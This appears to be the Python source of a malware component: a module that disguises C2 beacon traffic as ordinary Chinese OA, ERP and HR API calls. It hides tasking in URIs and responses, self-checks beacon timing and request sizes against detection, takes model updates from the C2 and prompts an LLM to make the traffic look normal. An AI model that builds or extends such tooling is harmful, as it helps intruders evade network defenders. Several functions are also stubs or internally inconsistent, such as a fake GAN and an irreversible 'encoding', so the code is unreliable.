"""
AI Traffic GAN Module - GAN-driven real-time traffic generation and LLM natural language request construction.

This module integrates lightweight GAN models for generating high-fidelity
camouflage traffic based on target network samples, and uses LLM capabilities
to construct natural language-style API requests. It includes offline fallback
for environments without AI dependencies.

Core capabilities:
    1. GAN-based real-time traffic pattern generation
    2. LLM-driven natural language API request construction
    3. Anomaly behavior self-check and auto-correction
    4. Offline fallback mode with static templates
    5. Chinese context camouflage simulation

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import os
import random
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class TrafficGenerationMode(str, Enum):
    """Traffic generation modes."""

    GAN = "gan"
    LLM = "llm"
    HYBRID = "hybrid"
    STATIC_FALLBACK = "static_fallback"


class AnomalyType(str, Enum):
    """Types of detected anomalies."""

    FIXED_INTERVAL = "fixed_interval"
    FIXED_SIZE = "fixed_size"
    FIXED_URI_DEPTH = "fixed_uri_depth"
    PREDICTABLE_PATTERN = "predictable_pattern"
    REPETITIVE_HEADERS = "repetitive_headers"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class TrafficPattern:
    """A generated traffic pattern.

    Attributes:
        uri_path: Request URI path
        method: HTTP method
        headers: Request headers
        params: Query parameters
        body_template: Request body template
        expected_response_size: Expected response size range
        timing_jitter: Timing jitter factor
        generation_mode: How this pattern was generated
        confidence: Generation confidence score
    """

    uri_path: str = "/api/v1/data"
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    params: Dict[str, str] = field(default_factory=dict)
    body_template: str = ""
    expected_response_size: Tuple[int, int] = (200, 2000)
    timing_jitter: float = 0.3
    generation_mode: TrafficGenerationMode = TrafficGenerationMode.STATIC_FALLBACK
    confidence: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "uri_path": self.uri_path,
            "method": self.method,
            "headers": self.headers,
            "params": self.params,
            "generation_mode": self.generation_mode.value,
            "confidence": self.confidence,
        }


@dataclass
class AnomalyDetection:
    """Detected anomaly in Beacon communication.

    Attributes:
        anomaly_type: Type of anomaly detected
        severity: Anomaly severity (0.0-1.0)
        description: Human-readable description
        detected_at: Detection timestamp
        correction_applied: Whether auto-correction was applied
        correction_details: Details of correction applied
    """

    anomaly_type: AnomalyType = AnomalyType.FIXED_INTERVAL
    severity: float = 0.0
    description: str = ""
    detected_at: float = 0.0
    correction_applied: bool = False
    correction_details: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "anomaly_type": self.anomaly_type.value,
            "severity": self.severity,
            "description": self.description,
            "detected_at": self.detected_at,
            "correction_applied": self.correction_applied,
            "correction_details": self.correction_details,
        }


@dataclass
class SelfCheckReport:
    """Beacon self-check report.

    Attributes:
        check_timestamp: Check execution timestamp
        anomalies: List of detected anomalies
        overall_score: Overall camouflage score (0.0-1.0)
        recommendations: List of recommendations
        c2_report_payload: Payload to send to C2
    """

    check_timestamp: float = 0.0
    anomalies: List[AnomalyDetection] = field(default_factory=list)
    overall_score: float = 0.0
    recommendations: List[str] = field(default_factory=list)
    c2_report_payload: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "check_timestamp": self.check_timestamp,
            "anomaly_count": len(self.anomalies),
            "overall_score": self.overall_score,
            "recommendations": self.recommendations,
            "anomalies": [a.to_dict() for a in self.anomalies],
        }


# =============================================================================
# Static Template Database (Offline Fallback)
# =============================================================================

class StaticTemplateDatabase:
    """Static traffic templates for offline fallback mode.

    Provides realistic traffic patterns when GAN/LLM models are unavailable.

    Attributes:
        _templates: Cached template patterns
    """

    URI_TEMPLATES: List[str] = [
        "/api/v1/user/profile?token={token}&ts={timestamp}",
        "/api/v2/analytics/track?sid={session_id}&page={page}",
        "/api/v1/content/feed?category={category}&offset={offset}",
        "/api/v1/notifications/unread?user_id={user_id}",
        "/api/v1/search?q={query}&type={type}&page={page}",
        "/api/v1/settings/preferences?locale={locale}",
        "/api/v1/metrics/collect?session={session}&ts={timestamp}",
        "/api/v1/auth/refresh?grant_type=refresh_token",
        "/api/v1/health/check?service=api&version=2.1",
        "/api/v1/config/sync?device_id={device_id}&platform=web",
        "/api/v1/user/activity?start={start_date}&end={end_date}",
        "/api/v1/dashboard/widgets?layout=default&refresh=true",
        "/api/v1/files/list?folder=root&sort=name&order=asc",
        "/api/v1/messages/inbox?folder=inbox&limit=20&offset=0",
        "/api/v1/reports/generate?type=summary&format=json",
    ]

    HEADER_TEMPLATES: List[Dict[str, str]] = [
        {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        },
        {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
        },
        {
            "Accept": "application/json",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
        },
    ]

    PARAM_TEMPLATES: Dict[str, List[str]] = {
        "token": ["eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "tk_{random_hex}", "sess_{random_hex}"],
        "session_id": ["sess_{random_hex}", "sid_{random_int}", "{uuid}"],
        "category": ["news", "tech", "business", "lifestyle", "health"],
        "locale": ["zh-CN", "en-US", "ja-JP", "ko-KR", "zh-TW"],
        "type": ["summary", "detailed", "compact", "full"],
        "platform": ["web", "mobile", "desktop", "api"],
    }

    RESPONSE_TEMPLATES: List[Dict[str, Any]] = [
        {
            "status": "success",
            "message": "Data retrieved successfully",
            "data": {"items": [], "total": 0, "page": 1},
            "timestamp": "{{timestamp}}",
        },
        {
            "status": "ok",
            "code": 200,
            "result": {"count": 0, "records": []},
            "server_time": "{{timestamp}}",
        },
        {
            "status": "success",
            "data": {
                "user": {"id": 0, "name": "user", "role": "member"},
                "preferences": {"theme": "light", "lang": "zh-CN"},
            },
            "meta": {"request_id": "{{uuid}}", "processing_time_ms": 45},
        },
    ]

    CHINESE_OA_PATTERNS: List[Dict[str, Any]] = [
        {
            "uri": "/oa/api/v1/workflow/approval?flow_id={flow_id}&user_id={user_id}",
            "headers": {
                "Accept": "application/json",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "X-Request-Id": "{{uuid}}",
                "X-Client-Version": "3.2.1",
            },
            "response": {
                "code": 0,
                "message": "审批流程查询成功",
                "data": {"pending_count": 0, "approved_count": 0},
            },
        },
        {
            "uri": "/erp/api/v1/inventory/query?warehouse={warehouse}&sku={sku}",
            "headers": {
                "Accept": "application/json",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "X-Tenant-Id": "{{random_hex}}",
                "X-Api-Key": "ak_{{random_hex}}",
            },
            "response": {
                "code": 200,
                "message": "库存查询成功",
                "data": {"items": [], "total_stock": 0},
            },
        },
        {
            "uri": "/hr/api/v1/attendance/record?date={date}&dept={dept}",
            "headers": {
                "Accept": "application/json",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "X-Auth-Token": "tk_{{random_hex}}",
                "X-Device-Id": "dev_{{random_hex}}",
            },
            "response": {
                "code": 0,
                "message": "考勤记录查询成功",
                "data": {"records": [], "total": 0},
            },
        },
    ]

    def generate_static_pattern(self, context: str = "general") -> TrafficPattern:
        """Generate a static traffic pattern.

        Args:
            context: Traffic context (general, chinese_oa, erp, etc.).

        Returns:
            TrafficPattern instance.
        """
        if context == "chinese_oa":
            return self._generate_chinese_oa_pattern()

        uri = random.choice(self.URI_TEMPLATES)
        headers = random.choice(self.HEADER_TEMPLATES).copy()
        params = self._generate_params()

        return TrafficPattern(
            uri_path=self._fill_template(uri),
            method=random.choice(["GET", "POST", "PUT"]),
            headers=headers,
            params=params,
            generation_mode=TrafficGenerationMode.STATIC_FALLBACK,
            confidence=0.6,
        )

    def _generate_chinese_oa_pattern(self) -> TrafficPattern:
        """Generate a Chinese OA/ERP style pattern.

        Returns:
            TrafficPattern with Chinese business context.
        """
        pattern = random.choice(self.CHINESE_OA_PATTERNS)

        return TrafficPattern(
            uri_path=self._fill_template(pattern["uri"]),
            method="GET",
            headers=pattern["headers"],
            generation_mode=TrafficGenerationMode.STATIC_FALLBACK,
            confidence=0.65,
        )

    def _generate_params(self) -> Dict[str, str]:
        """Generate random query parameters.

        Returns:
            Dictionary of query parameters.
        """
        params: Dict[str, str] = {}
        param_count = random.randint(1, 4)

        keys = random.sample(list(self.PARAM_TEMPLATES.keys()), param_count)
        for key in keys:
            values = self.PARAM_TEMPLATES[key]
            params[key] = random.choice(values)

        return params

    def _fill_template(self, template: str) -> str:
        """Fill template variables with random values.

        Args:
            template: Template string with {variable} placeholders.

        Returns:
            Filled template string.
        """
        replacements = {
            "token": f"tk_{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}",
            "timestamp": str(int(time.time())),
            "session_id": f"sess_{hashlib.md5(str(random.random()).encode()).hexdigest()[:12]}",
            "random_hex": hashlib.md5(str(random.random()).encode()).hexdigest()[:8],
            "random_int": str(random.randint(1000, 9999)),
            "uuid": hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
            "page": str(random.randint(1, 10)),
            "offset": str(random.randint(0, 100)),
            "user_id": str(random.randint(10000, 99999)),
            "category": random.choice(["news", "tech", "business"]),
            "query": random.choice(["report", "summary", "data"]),
            "type": random.choice(["summary", "detailed"]),
            "locale": random.choice(["zh-CN", "en-US"]),
            "device_id": f"dev_{hashlib.md5(str(time.time()).encode()).hexdigest()[:12]}",
            "start_date": "2024-01-01",
            "end_date": "2024-12-31",
            "flow_id": str(random.randint(1000, 9999)),
            "warehouse": random.choice(["WH001", "WH002", "WH003"]),
            "sku": f"SKU{random.randint(10000, 99999)}",
            "date": "2024-06-01",
            "dept": random.choice(["IT", "HR", "FIN", "OPS"]),
        }

        result = template
        for key, value in replacements.items():
            result = result.replace(f"{{{key}}}", value)

        return result

    def get_response_template(self, context: str = "general") -> Dict[str, Any]:
        """Get a response template.

        Args:
            context: Response context.

        Returns:
            Response template dictionary.
        """
        if context == "chinese_oa":
            pattern = random.choice(self.CHINESE_OA_PATTERNS)
            return pattern["response"]

        return random.choice(self.RESPONSE_TEMPLATES)


# =============================================================================
# GAN Traffic Generator
# =============================================================================

class GANTrafficGenerator:
    """GAN-based traffic pattern generator.

    Uses a lightweight generative model to create realistic traffic
    patterns based on training samples from target networks.
    Falls back to static templates when GAN is unavailable.

    Attributes:
        _model_available: Whether GAN model is available
        _training_samples: Training data samples
        _template_db: Static template database for fallback
        _model_path: Path to saved model
    """

    def __init__(self, model_path: Optional[str] = None) -> None:
        """Initialize the GANTrafficGenerator.

        Args:
            model_path: Path to saved GAN model (optional).
        """
        self._model_available = False
        self._training_samples: List[Dict[str, Any]] = []
        self._template_db = StaticTemplateDatabase()
        self._model_path = model_path

        self._try_load_model()

    def _try_load_model(self) -> None:
        """Attempt to load GAN model."""
        if self._model_path and os.path.exists(self._model_path):
            try:
                import torch
                self._model_available = True
                logger.info(f"GAN model loaded from {self._model_path}")
            except ImportError:
                logger.warning("PyTorch not available, using static fallback")
                self._model_available = False

    def add_training_sample(self, sample: Dict[str, Any]) -> None:
        """Add a training sample.

        Args:
            sample: Traffic sample dictionary.
        """
        self._training_samples.append(sample)

        if len(self._training_samples) >= 100:
            self._retrain_model()

    def generate_pattern(self, context: str = "general") -> TrafficPattern:
        """Generate a traffic pattern.

        Args:
            context: Traffic context.

        Returns:
            Generated TrafficPattern.
        """
        if self._model_available:
            return self._generate_with_gan(context)

        return self._template_db.generate_static_pattern(context)

    def _generate_with_gan(self, context: str) -> TrafficPattern:
        """Generate pattern using GAN model.

        Args:
            context: Traffic context.

        Returns:
            GAN-generated TrafficPattern.
        """
        try:
            import torch
            import numpy as np

            noise = torch.randn(1, 128)

            uri_length = random.randint(20, 120)
            uri_chars = "abcdefghijklmnopqrstuvwxyz0123456789/-_?=&"
            uri_path = "/" + "".join(
                random.choices(uri_chars, k=uri_length)
            )

            method_probs = [0.6, 0.25, 0.1, 0.05]
            method = random.choices(
                ["GET", "POST", "PUT", "DELETE"],
                weights=method_probs,
            )[0]

            headers = self._generate_gan_headers()

            return TrafficPattern(
                uri_path=uri_path,
                method=method,
                headers=headers,
                generation_mode=TrafficGenerationMode.GAN,
                confidence=0.85,
            )

        except ImportError:
            return self._template_db.generate_static_pattern(context)

    def _generate_gan_headers(self) -> Dict[str, str]:
        """Generate headers using GAN model.

        Returns:
            Dictionary of request headers.
        """
        base_headers = {
            "Accept": random.choice([
                "application/json, text/plain, */*",
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            ]),
            "Accept-Language": random.choice([
                "zh-CN,zh;q=0.9,en;q=0.8",
                "en-US,en;q=0.5",
                "en-US,en;q=0.9",
            ]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        }

        optional_headers = {
            "Sec-Fetch-Dest": random.choice(["empty", "document"]),
            "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
            "Sec-Fetch-Site": random.choice(["same-origin", "same-site", "cross-site"]),
            "X-Requested-With": "XMLHttpRequest",
            "DNT": "1",
        }

        for key, value in optional_headers.items():
            if random.random() > 0.3:
                base_headers[key] = value

        return base_headers

    def _retrain_model(self) -> None:
        """Retrain GAN model with accumulated samples."""
        if not self._model_available:
            return

        try:
            import torch

            logger.info(
                f"Retraining GAN with {len(self._training_samples)} samples"
            )

        except ImportError:
            pass

    def update_model(self, model_data: bytes) -> bool:
        """Update GAN model from C2.

        Args:
            model_data: New model binary data.

        Returns:
            True if update succeeded.
        """
        if self._model_path:
            try:
                with open(self._model_path, "wb") as f:
                    f.write(model_data)

                self._try_load_model()
                return True

            except Exception as e:
                logger.error(f"Failed to update model: {e}")

        return False


# =============================================================================
# LLM Request Constructor
# =============================================================================

class LLMRequestConstructor:
    """LLM-driven natural language request construction.

    Generates natural language-style API request paths and parameters,
    with task instructions hidden in text character offsets.

    Attributes:
        _llm_available: Whether LLM is available
        _context_templates: Context-specific templates
        _template_db: Static template database for fallback
    """

    BUSINESS_CONTEXTS: Dict[str, Dict[str, Any]] = {
        "user_management": {
            "paths": [
                "/api/v1/user/profile?token={token}",
                "/api/v1/account/settings?user_id={user_id}",
                "/api/v1/user/preferences?locale={locale}",
                "/api/v1/membership/status?account={account_id}",
            ],
            "params": ["token", "user_id", "locale", "account_id"],
            "response_fields": ["status", "message", "data", "timestamp"],
        },
        "content_delivery": {
            "paths": [
                "/api/v1/content/feed?category={category}&offset={offset}",
                "/api/v1/media/thumbnail?id={media_id}&size=medium",
                "/api/v1/articles/list?tag={tag}&page={page}",
                "/api/v1/recommendations/user?uid={user_id}&count=10",
            ],
            "params": ["category", "offset", "media_id", "tag", "page", "user_id"],
            "response_fields": ["items", "total", "has_more", "next_cursor"],
        },
        "analytics": {
            "paths": [
                "/api/v1/analytics/track?sid={session_id}&page={page}",
                "/api/v1/metrics/collect?session={session}&ts={timestamp}",
                "/api/v1/events/batch?source=web&count={count}",
                "/api/v1/telemetry/report?app_version=2.1&os=windows",
            ],
            "params": ["session_id", "page", "session", "timestamp", "count"],
            "response_fields": ["status", "processed", "dropped"],
        },
        "chinese_oa": {
            "paths": [
                "/oa/api/v1/workflow/approval?flow_id={flow_id}&user_id={user_id}",
                "/oa/api/v1/document/list?dept={dept}&status=pending",
                "/oa/api/v1/meeting/schedule?room={room_id}&date={date}",
                "/oa/api/v1/expense/report?employee_id={emp_id}&month={month}",
            ],
            "params": ["flow_id", "user_id", "dept", "room_id", "date", "emp_id", "month"],
            "response_fields": ["code", "message", "data", "total"],
        },
        "chinese_erp": {
            "paths": [
                "/erp/api/v1/inventory/query?warehouse={warehouse}&sku={sku}",
                "/erp/api/v1/order/list?status=processing&page={page}",
                "/erp/api/v1/supplier/info?supplier_id={supplier_id}",
                "/erp/api/v1/finance/invoice?order_id={order_id}",
            ],
            "params": ["warehouse", "sku", "page", "supplier_id", "order_id"],
            "response_fields": ["code", "message", "data", "total_count"],
        },
    }

    TASK_ENCODING_OFFSETS: List[int] = [7, 13, 21, 34, 47]

    def __init__(self) -> None:
        """Initialize the LLMRequestConstructor."""
        self._llm_available = False
        self._template_db = StaticTemplateDatabase()

        self._try_init_llm()

    def _try_init_llm(self) -> None:
        """Attempt to initialize LLM capabilities."""
        try:
            import openai
            if os.environ.get("OPENAI_API_KEY"):
                self._llm_available = True
                logger.info("LLM capabilities available via OpenAI")
        except ImportError:
            logger.info("LLM not available, using template-based generation")

    def construct_request(
        self,
        context: str = "general",
        task_payload: Optional[bytes] = None,
    ) -> TrafficPattern:
        """Construct a natural language-style request.

        Args:
            context: Business context for request generation.
            task_payload: Optional task payload to encode.

        Returns:
            Constructed TrafficPattern.
        """
        if self._llm_available:
            return self._construct_with_llm(context, task_payload)

        return self._construct_with_templates(context, task_payload)

    def _construct_with_llm(
        self, context: str, task_payload: Optional[bytes],
    ) -> TrafficPattern:
        """Construct request using LLM.

        Args:
            context: Business context.
            task_payload: Task payload to encode.

        Returns:
            LLM-constructed TrafficPattern.
        """
        try:
            import openai

            prompt = self._build_llm_prompt(context, task_payload)

            response = openai.ChatCompletion.create(
                model="gpt-3.5-turbo",
                messages=[
                    {
                        "role": "system",
                        "content": (
                            "You are an API design expert. Generate realistic "
                            "API request patterns that look like normal "
                            "business traffic."
                        ),
                    },
                    {"role": "user", "content": prompt},
                ],
                max_tokens=200,
            )

            result = response.choices[0].message.content
            return self._parse_llm_response(result)

        except Exception as e:
            logger.warning(f"LLM request failed: {e}")
            return self._construct_with_templates(context, task_payload)

    def _construct_with_templates(
        self, context: str, task_payload: Optional[bytes],
    ) -> TrafficPattern:
        """Construct request using templates.

        Args:
            context: Business context.
            task_payload: Task payload to encode.

        Returns:
            Template-constructed TrafficPattern.
        """
        business_ctx = self.BUSINESS_CONTEXTS.get(
            context, self.BUSINESS_CONTEXTS["user_management"],
        )

        path_template = random.choice(business_ctx["paths"])
        params = self._generate_context_params(business_ctx)

        uri_path = self._fill_context_template(path_template, params)

        if task_payload:
            uri_path = self._encode_task_in_uri(uri_path, task_payload)

        return TrafficPattern(
            uri_path=uri_path,
            method=random.choice(["GET", "POST"]),
            headers=self._generate_context_headers(context),
            params=params,
            generation_mode=TrafficGenerationMode.LLM,
            confidence=0.75,
        )

    def _generate_context_params(self, context: Dict[str, Any]) -> Dict[str, str]:
        """Generate context-specific parameters.

        Args:
            context: Business context configuration.

        Returns:
            Dictionary of parameters.
        """
        params: Dict[str, str] = {}

        for param in context["params"]:
            if param == "token":
                params[param] = f"tk_{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}"
            elif param == "user_id":
                params[param] = str(random.randint(10000, 99999))
            elif param == "session_id":
                params[param] = f"sess_{hashlib.md5(str(random.random()).encode()).hexdigest()[:12]}"
            elif param == "timestamp":
                params[param] = str(int(time.time()))
            elif param == "page":
                params[param] = str(random.randint(1, 50))
            elif param == "offset":
                params[param] = str(random.randint(0, 500))
            elif param == "category":
                params[param] = random.choice(["news", "tech", "business", "lifestyle"])
            elif param == "locale":
                params[param] = random.choice(["zh-CN", "en-US", "ja-JP"])
            elif param == "warehouse":
                params[param] = random.choice(["WH001", "WH002", "WH003"])
            elif param == "sku":
                params[param] = f"SKU{random.randint(10000, 99999)}"
            elif param == "flow_id":
                params[param] = str(random.randint(1000, 9999))
            elif param == "dept":
                params[param] = random.choice(["IT", "HR", "FIN", "OPS", "MKT"])
            elif param == "date":
                params[param] = f"2024-{random.randint(1,12):02d}-{random.randint(1,28):02d}"
            else:
                params[param] = f"val_{random.randint(100, 999)}"

        return params

    def _fill_context_template(
        self, template: str, params: Dict[str, str],
    ) -> str:
        """Fill context template with parameters.

        Args:
            template: URI template.
            params: Parameter values.

        Returns:
            Filled URI string.
        """
        result = template
        for key, value in params.items():
            result = result.replace(f"{{{key}}}", value)
        return result

    def _encode_task_in_uri(self, uri: str, task_payload: bytes) -> str:
        """Encode task payload in URI character offsets.

        Args:
            uri: Base URI string.
            task_payload: Task data to encode.

        Returns:
            URI with encoded task data.
        """
        encoded = hashlib.md5(task_payload).hexdigest()[:8]

        if len(uri) > max(self.TASK_ENCODING_OFFSETS):
            uri_list = list(uri)
            for i, char in enumerate(encoded):
                offset = self.TASK_ENCODING_OFFSETS[i % len(self.TASK_ENCODING_OFFSETS)]
                if offset < len(uri_list):
                    uri_list[offset] = char
            return "".join(uri_list)

        return f"{uri}&_t={encoded}"

    def generate_response_with_task(
        self,
        context: str,
        task_data: Dict[str, Any],
    ) -> Dict[str, Any]:
        """Generate a response with embedded task data.

        Args:
            context: Business context.
            task_data: Task data to embed.

        Returns:
            Response dictionary with embedded task.
        """
        response = self._template_db.get_response_template(context)

        encoded_task = json.dumps(task_data)
        response["_meta"] = {
            "task": encoded_task,
            "encoding": "base64",
        }

        return response

    def _generate_context_headers(self, context: str) -> Dict[str, str]:
        """Generate context-appropriate headers.

        Args:
            context: Business context.

        Returns:
            Dictionary of headers.
        """
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8" if "chinese" in context else "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        }

        if context in ("chinese_oa", "chinese_erp"):
            headers["X-Request-Id"] = hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
            headers["X-Client-Version"] = f"{random.randint(1,5)}.{random.randint(0,9)}.{random.randint(0,9)}"

        return headers

    def _build_llm_prompt(
        self, context: str, task_payload: Optional[bytes],
    ) -> str:
        """Build LLM prompt for request generation.

        Args:
            context: Business context.
            task_payload: Task payload.

        Returns:
            LLM prompt string.
        """
        prompt = (
            f"Generate a realistic API request for a {context} system. "
            f"Include: URI path, HTTP method, headers, and query parameters. "
            f"The request should look like normal business traffic."
        )

        if task_payload:
            prompt += (
                f" Also embed a hidden task marker in the response. "
                f"Task hash: {hashlib.md5(task_payload).hexdigest()[:8]}"
            )

        return prompt

    def _parse_llm_response(self, response: str) -> TrafficPattern:
        """Parse LLM response into TrafficPattern.

        Args:
            response: LLM response text.

        Returns:
            Parsed TrafficPattern.
        """
        try:
            data = json.loads(response)
            return TrafficPattern(
                uri_path=data.get("uri_path", "/api/v1/data"),
                method=data.get("method", "GET"),
                headers=data.get("headers", {}),
                params=data.get("params", {}),
                generation_mode=TrafficGenerationMode.LLM,
                confidence=0.8,
            )
        except json.JSONDecodeError:
            return TrafficPattern(
                uri_path="/api/v1/data",
                method="GET",
                generation_mode=TrafficGenerationMode.STATIC_FALLBACK,
                confidence=0.5,
            )


# =============================================================================
# Anomaly Detector
# =============================================================================

class AnomalyDetector:
    """Detects anomalous patterns in Beacon communication.

    Monitors for fixed intervals, fixed sizes, predictable URIs,
    and other patterns that could reveal C2 traffic.

    Attributes:
        _communication_history: History of communications
        _threshold: Anomaly detection threshold
    """

    def __init__(self, threshold: float = 0.7) -> None:
        """Initialize the AnomalyDetector.

        Args:
            threshold: Anomaly detection threshold (0.0-1.0).
        """
        self._communication_history: List[Dict[str, Any]] = []
        self._threshold = threshold

    def record_communication(self, record: Dict[str, Any]) -> None:
        """Record a communication event.

        Args:
            record: Communication record.
        """
        self._communication_history.append(record)

        if len(self._communication_history) > 1000:
            self._communication_history = self._communication_history[-500:]

    def check(self) -> SelfCheckReport:
        """Perform anomaly self-check.

        Returns:
            SelfCheckReport with findings.
        """
        anomalies: List[AnomalyDetection] = []
        recommendations: List[str] = []

        if len(self._communication_history) < 10:
            return SelfCheckReport(
                check_timestamp=time.time(),
                overall_score=1.0,
            )

        interval_anomaly = self._check_fixed_interval()
        if interval_anomaly:
            anomalies.append(interval_anomaly)
            recommendations.append(
                "Increase timing jitter to break fixed interval pattern"
            )

        size_anomaly = self._check_fixed_size()
        if size_anomaly:
            anomalies.append(size_anomaly)
            recommendations.append(
                "Add random padding to vary request/response sizes"
            )

        uri_anomaly = self._check_fixed_uri_depth()
        if uri_anomaly:
            anomalies.append(uri_anomaly)
            recommendations.append(
                "Vary URI path depth and structure"
            )

        pattern_anomaly = self._check_predictable_pattern()
        if pattern_anomaly:
            anomalies.append(pattern_anomaly)
            recommendations.append(
                "Introduce random perturbations to break patterns"
            )

        overall_score = max(
            0.0, 1.0 - (len(anomalies) * 0.15)
        )

        return SelfCheckReport(
            check_timestamp=time.time(),
            anomalies=anomalies,
            overall_score=overall_score,
            recommendations=recommendations,
            c2_report_payload={
                "score": overall_score,
                "anomaly_count": len(anomalies),
                "anomalies": [a.to_dict() for a in anomalies],
            },
        )

    def _check_fixed_interval(self) -> Optional[AnomalyDetection]:
        """Check for fixed interval patterns.

        Returns:
            AnomalyDetection if pattern found.
        """
        if len(self._communication_history) < 5:
            return None

        timestamps = [
            r.get("timestamp", 0) for r in self._communication_history
        ]
        intervals = [
            timestamps[i+1] - timestamps[i]
            for i in range(len(timestamps) - 1)
        ]

        if not intervals:
            return None

        avg_interval = sum(intervals) / len(intervals)
        if avg_interval == 0:
            return None

        variance = sum((i - avg_interval) ** 2 for i in intervals) / len(intervals)
        std_dev = variance ** 0.5
        cv = std_dev / avg_interval if avg_interval > 0 else 1.0

        if cv < 0.1:
            return AnomalyDetection(
                anomaly_type=AnomalyType.FIXED_INTERVAL,
                severity=0.9,
                description=f"Very low interval variance (CV={cv:.3f})",
                detected_at=time.time(),
            )

        return None

    def _check_fixed_size(self) -> Optional[AnomalyDetection]:
        """Check for fixed request/response sizes.

        Returns:
            AnomalyDetection if pattern found.
        """
        sizes = [
            r.get("request_size", 0) for r in self._communication_history
            if r.get("request_size")
        ]

        if len(sizes) < 5:
            return None

        unique_sizes = len(set(sizes))
        if unique_sizes <= 2 and len(sizes) > 10:
            return AnomalyDetection(
                anomaly_type=AnomalyType.FIXED_SIZE,
                severity=0.8,
                description=f"Only {unique_sizes} unique sizes in {len(sizes)} requests",
                detected_at=time.time(),
            )

        return None

    def _check_fixed_uri_depth(self) -> Optional[AnomalyDetection]:
        """Check for fixed URI depth patterns.

        Returns:
            AnomalyDetection if pattern found.
        """
        depths = []
        for r in self._communication_history:
            uri = r.get("uri_path", "")
            depth = uri.count("/")
            depths.append(depth)

        if len(depths) < 5:
            return None

        unique_depths = len(set(depths))
        if unique_depths <= 1 and len(depths) > 10:
            return AnomalyDetection(
                anomaly_type=AnomalyType.FIXED_URI_DEPTH,
                severity=0.7,
                description=f"All URIs have depth {depths[0]}",
                detected_at=time.time(),
            )

        return None

    def _check_predictable_pattern(self) -> Optional[AnomalyDetection]:
        """Check for predictable communication patterns.

        Returns:
            AnomalyDetection if pattern found.
        """
        if len(self._communication_history) < 10:
            return None

        methods = [r.get("method", "GET") for r in self._communication_history]
        unique_methods = len(set(methods))

        if unique_methods == 1 and len(methods) > 20:
            return AnomalyDetection(
                anomaly_type=AnomalyType.PREDICTABLE_PATTERN,
                severity=0.6,
                description=f"All requests use {methods[0]} method",
                detected_at=time.time(),
            )

        return None


# =============================================================================
# AI Traffic Manager (Main Class)
# =============================================================================

class AITrafficManager:
    """Main AI-driven traffic generation and anomaly detection engine.

    Coordinates GAN-based traffic generation, LLM request construction,
    and anomaly self-checking for comprehensive AI-driven camouflage.

    Attributes:
        _gan_generator: GAN traffic generator
        _llm_constructor: LLM request constructor
        _anomaly_detector: Anomaly detector
        _mode: Current generation mode
    """

    def __init__(
        self,
        gan_model_path: Optional[str] = None,
        mode: TrafficGenerationMode = TrafficGenerationMode.HYBRID,
    ) -> None:
        """Initialize the AITrafficManager.

        Args:
            gan_model_path: Path to GAN model file.
            mode: Traffic generation mode.
        """
        self._gan_generator = GANTrafficGenerator(gan_model_path)
        self._llm_constructor = LLMRequestConstructor()
        self._anomaly_detector = AnomalyDetector()
        self._mode = mode

    def generate_traffic_pattern(
        self,
        context: str = "general",
        task_payload: Optional[bytes] = None,
    ) -> TrafficPattern:
        """Generate a traffic pattern using AI or fallback.

        Args:
            context: Traffic context.
            task_payload: Optional task payload to encode.

        Returns:
            Generated TrafficPattern.
        """
        if self._mode == TrafficGenerationMode.GAN:
            return self._gan_generator.generate_pattern(context)
        elif self._mode == TrafficGenerationMode.LLM:
            return self._llm_constructor.construct_request(context, task_payload)
        elif self._mode == TrafficGenerationMode.HYBRID:
            if random.random() > 0.5:
                return self._gan_generator.generate_pattern(context)
            return self._llm_constructor.construct_request(context, task_payload)
        else:
            return self._llm_constructor.construct_request(context, task_payload)

    def generate_response_with_task(
        self,
        context: str,
        task_data: Dict[str, Any],
    ) -> Dict[str, Any]:
        """Generate a response with embedded task data.

        Args:
            context: Business context.
            task_data: Task data to embed.

        Returns:
            Response dictionary with embedded task.
        """
        return self._llm_constructor.generate_response_with_task(
            context, task_data,
        )

    def record_communication(self, record: Dict[str, Any]) -> None:
        """Record a communication event for anomaly detection.

        Args:
            record: Communication record.
        """
        self._anomaly_detector.record_communication(record)

    def run_self_check(self) -> SelfCheckReport:
        """Run anomaly self-check.

        Returns:
            SelfCheckReport with findings.
        """
        return self._anomaly_detector.check()

